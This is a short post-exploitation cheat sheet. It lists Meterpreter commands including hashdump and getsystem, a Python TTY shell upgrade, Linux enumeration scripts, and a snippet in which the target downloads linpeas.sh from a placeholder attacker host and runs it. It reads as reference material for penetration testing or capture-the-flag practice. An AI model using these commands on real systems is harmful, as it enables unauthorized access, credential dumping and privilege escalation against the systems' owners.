# Post-Exploitation

Actions taken after gaining initial access.

## Meterpreter (Metasploit)

An advanced, multi-functional payload.

| Command | Description |
| :--- | :--- |
| `sysinfo` | Get system information. |
| `getuid` | Get the user the server is running as. |
| `ps` | List running processes. |
| `migrate <pid>` | Migrate to another process. |
| `upload <file>` | Upload a file to the target. |
| `download <file>` | Download a file from the target. |
| `shell` | Drop into a standard system shell. |
| `getsystem` | Attempt to elevate privileges to SYSTEM. |
| `hashdump` | Dump password hashes from SAM. |

## Upgrading a Dumb Shell

Often you get a "dumb" shell (`sh`). Upgrade it to a fully interactive TTY:

```bash
# Python TTY upgrade
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# After spawning, make it fully interactive:
# Press Ctrl+Z to background the shell, then:
stty raw -echo; fg
export TERM=xterm
```

## Linux Privilege Escalation

### Common Enumeration Scripts

| Script | Description |
| :--- | :--- |
| `LinEnum.sh` | Comprehensive Linux enumeration. |
| `linpeas.sh` | Linux Privilege Escalation Awesome Script. |
| `linux-exploit-suggester.sh` | Suggests kernel exploits. |

### Quick Transfer to Target

```bash
# On attacker: Start a web server
python3 -m http.server 80

# On target: Download and run
wget http://<attacker_ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
